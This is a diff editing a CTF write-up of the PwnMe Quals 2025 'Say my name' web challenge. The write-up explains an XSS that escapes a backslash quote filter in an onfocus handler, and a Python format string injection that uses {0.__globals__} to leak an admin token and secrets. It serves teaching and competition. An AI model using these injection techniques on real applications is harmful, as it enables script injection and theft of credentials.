@@ -6,13 +6,14 @@ ctf: "PwnMe Quals 2025"
 category: "web"
 author: "sealldev & Solopie"
 section: "CTFs"
+image: "images/25-pwnmequals/icon.png"
 ---
 
 > Original Writeup on [seall.dev](https://seall.dev/posts/pwnmequals2025#say-my-name)
 
 This was a medium whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Say_my_name)
 
-## Intial look
+## Initial Look
 
 The flag is stored in the environment variables of the application:
 
@@ -97,7 +98,7 @@ Some initial observations:
 
 ## XSS
 
-Looking at the sanitize first, it seems to not have a proper sanitisation mechanism.
+Looking at the sanitise first, it seems to not have a proper sanitisation of inputs.
 
 ```python
 def sanitize_input(input_string):
@@ -129,30 +130,30 @@ Looking at the sanitisation of `your-name.html`, we can see the injection points
 
 So the injection points are of varying interest:
 
-- The injection point inside the `<a>` isn't super interesting as we can't create new tags without `<` and `>`.
-- We can't escape the href with the `\"` method
-- The injection point inside the `onfocus` is filtered through `safe` but we can still achieve XSS!
+- The injection point inside the `<a>` isn't interesting as we can't create new tags without `<` and `>`.
+- We can't escape the `href` with the `\"` method
+- The injection point inside the `onfocus` is filtered through `safe`, but we can still achieve XSS!
 
-`onfocus` as well as other `on` attributes (and others) execution JavaScript, so as it's using `document.location` to redirect the user, we can escape the string its redirecting to and add our own JavaAscript!
+`onfocus` as well as other `on` attributes can execute JavaScript. This particular one is using `document.location` to redirect the user, we can escape the string its redirecting to and add our own JavaScript!
 
 Let's make a sample payload first for the `onfocus` attribute:
 `\";console.log(1);//`
 
-The reason this works is as `"` is replaced with `\"` when sanitised. If our input includes a backslash before we send our `"` we can escape the filtering backslash by doubling them up. This allows us to escape the `document.location` in onfocus.
+The reason this works is as `"` is replaced with `\"` when sanitised. If our input includes a backslash before we send our `"` we can escape the filtering backslash by doubling them up. This allows us to escape the `document.location` in `onfocus`.
 
-Eg. `"` becomes:
+E.g. `"` becomes:
 ```js
-document.location="https://www.behindthename.com/names/search.php?terms=\""
+document.location="...?terms=\""
 ```
 
 `\"` becomes:
 ```js
-document.location="https://www.behindthename.com/names/search.php?terms=\\""
+document.location="...?terms=\\""
 ```
 
 This allows us to escape the string with our payload:
 ```js
-document.location="https://www.behindthename.com/names/search.php?terms=\\";console.log(1);//"
+document.location="...?terms=\\";console.log(1);//"
 ```
 
 This should print `1` to the console before redirecting. Clicking the URL that's what we see!
@@ -233,13 +234,13 @@ def admin():
     return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))
 ```
 
-The `return render_template(...)` line has a Python format string vulnerability, as the string is a format string (indicated by the `f` at the start) and is then run with a `.format()`, meaning we can injection our own variables and potentially exfiltrate sensitive information.
+The `return render_template(...)` line has a Python format string vulnerability, as the string is a format string (indicated by the `f` at the start) and is then run with a `.format()`, meaning we can inject our own variables and potentially exfiltrate sensitive information.
 
 I start with some simple payloads to test it: `{0.__globals__}`
 
 We can send this on the `prompt` attribute on localhost to test: `http://localhost/admin?prompt={0.__globals__}`
 
-This returns the globals of the current exection:
+This returns the globals of the current execution:
 
 ```
  {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ff98d7d2220>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/app/app.py', '__cached__': None, 'Flask': <class 'flask.app.Flask'>, 'render_template': <function render_template at 0x7ff98c419040>, 'request': <Request 'http://localhost:5000/admin?prompt={0.__globals__}' [GET]>, 'Response': <class 'flask.wrappers.Response'>, 'redirect': <function redirect at 0x7ff98c5ac0d0>, 'url_for': <function url_for at 0x7ff98c618e50>, 'visit_report': <function visit_report at 0x7ff98c3dd670>, 'token_hex': <function token_hex at 0x7ff98c9ec940>, 'X_Admin_Token': '68fd3889bf98101b1639d81d8428955d', 'run_cmd': <function run_cmd at 0x7ff98d81d040>, 'sanitize_input': <function sanitize_input at 0x7ff98c0a9940>, 'app': <Flask 'app'>, 'admin': <function admin at 0x7ff98c1629d0>, 'index': <function index at 0x7ff98c162a60>, 'your_name': <function your_name at 0x7ff98c162c10>, 'report': <function report at 0x7ff98c162ca0>}None
